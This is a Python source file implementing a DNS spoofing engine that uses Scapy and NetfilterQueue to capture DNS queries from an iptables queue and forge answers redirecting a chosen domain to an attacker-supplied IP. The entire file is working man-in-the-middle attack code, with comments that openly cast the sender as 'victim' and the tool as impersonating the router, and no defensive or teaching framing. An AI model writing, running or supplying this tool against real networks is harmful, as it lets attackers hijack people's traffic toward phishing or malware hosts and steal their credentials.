import scapy.all as scapy
from netfilterqueue import NetfilterQueue
import threading
import os

class DnsSpoofer:
    """
    Engine to intercept and forge DNS responses.
    Uses NetfilterQueue to capture packets from the iptables NFQUEUE.
    """
    def __init__(self):
        self.target_domain = ""
        self.redirect_ip = ""
        self.queue_num = 0
        self.nfqueue = NetfilterQueue()
        self._stop_event = threading.Event()
        self._thread = None

    def _process_packet(self, packet):
        """
        Callback for each packet in the NFQUEUE.
        """
        try:
            # Wrap raw payload into a Scapy IP packet
            scapy_packet = scapy.IP(packet.get_payload())
            
            # Check if it has a DNS Query layer (DNSQR)
            if scapy_packet.haslayer(scapy.DNSQR):
                qname = scapy_packet[scapy.DNSQR].qname.decode()
                
                # Check if the requested domain matches our target
                # We use 'in' to match subdomains or partial names if needed
                if self.target_domain in qname:
                    print(f"[!] Spoofing DNS request for: {qname} -> {self.redirect_ip}")
                    
                    # Forge the response
                    # 1. Create the Answer Record (DNSRR)
                    answer = scapy.DNSRR(rrname=qname, rdata=self.redirect_ip)
                    
                    # 2. Add the answer to the DNS layer
                    scapy_packet[scapy.DNS].an = answer
                    scapy_packet[scapy.DNS].ancount = 1
                    
                    # 3. Set the packet as a Response (qr=1)
                    scapy_packet[scapy.DNS].qr = 1
                    
                    # 4. Swap IP and Port to send it back to the victim
                    # Original: Victim -> Router. Spoofed: Attacker(as Router) -> Victim
                    victim_ip = scapy_packet[scapy.IP].src
                    attacker_fake_src = scapy_packet[scapy.IP].dst
                    
                    scapy_packet[scapy.IP].src = attacker_fake_src
                    scapy_packet[scapy.IP].dst = victim_ip
                    
                    victim_port = scapy_packet[scapy.UDP].sport
                    dns_port = scapy_packet[scapy.UDP].dport
                    
                    scapy_packet[scapy.UDP].sport = dns_port
                    scapy_packet[scapy.UDP].dport = victim_port

                    # 5. Clear checksums and lengths so Scapy recalculates them
                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.UDP].len
                    del scapy_packet[scapy.UDP].chksum

                    # 6. Replace the payload and ACCEPT
                    packet.set_payload(bytes(scapy_packet))
                    packet.accept()
                    return

            # If not a target or not DNS, just let it pass
            packet.accept()
            
        except Exception as e:
            print(f"[-] Error processing DNS packet: {e}")
            packet.accept()

    def start(self, target_domain, redirect_ip):
        """
        Starts the DNS spoofer in a separate thread.
        """
        self.target_domain = target_domain
        self.redirect_ip = redirect_ip
        self._stop_event.clear()
        
        self.nfqueue.bind(self.queue_num, self._process_packet)
        self._thread = threading.Thread(target=self._run)
        self._thread.daemon = True
        self._thread.start()
        print(f"[*] DNS Spoofer started on Queue {self.queue_num}")

    def _run(self):
        try:
            self.nfqueue.run()
        except Exception as e:
            if not self._stop_event.is_set():
                print(f"[-] NFQUEUE Runtime error: {e}")

    def stop(self):
        """
        Stops the spoofer and unbinds the queue.
        """
        print("[*] Stopping DNS Spoofer...")
        self._stop_event.set()
        try:
            self.nfqueue.unbind()
        except:
            pass
        
        # Note: netfilterqueue.run() is blocking, unbind() usually breaks it.
        # If it doesn't stop gracefully, we have the daemon thread.
        print("[+] DNS Spoofer stopped.")
